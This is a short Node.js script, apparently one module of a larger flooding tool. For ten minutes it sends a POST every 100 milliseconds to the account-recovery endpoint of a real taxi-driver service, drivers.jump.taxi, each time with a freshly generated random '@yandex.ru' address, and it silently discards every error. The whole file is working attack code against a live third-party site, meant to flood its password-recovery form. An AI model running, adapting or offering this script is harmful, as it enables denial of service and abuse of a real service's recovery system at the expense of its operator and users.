global.app.request1 = false;
global.app.request2 = false;

global.app.request3 = true;
setTimeout(() => {
    global.app.request3 = false;
}, 10 * 60 * 1000);

var axios = require("axios");
var arr_en = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", ".", "-", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"];
var arr_num = [1, 3, 5, 7, 9];

setInterval(() => {
    try {
        if (global.app.request3 == true) {
            let email = "";
            let countWord = Date.now() % 13;
            if (countWord < 3) {
                countWord = 3;
            }
            for (let i = 0; i < countWord; i++) {
                let salt = Number(String(Date.now()).substr(-1)) + email.length;
                if (arr_num.indexOf(salt) != -1) {
                    salt = salt + 1;
                }
                if (arr_num.indexOf(Date.now() % salt) != -1) {
                    salt = salt + 1;
                }

                email += arr_en[(Date.now() + salt) % arr_en.length];
            }

            email += "@yandex.ru"

            try {
                axios.post("https://drivers.jump.taxi/ajax/auth-recovery.php", { email: email }).then(result => {}).catch(err => {});

            } catch (e) {
                console.log("e: " + 3)
            }
        }
    } catch (err) {
        console.log("err: "+ err)
    }
}, 100);
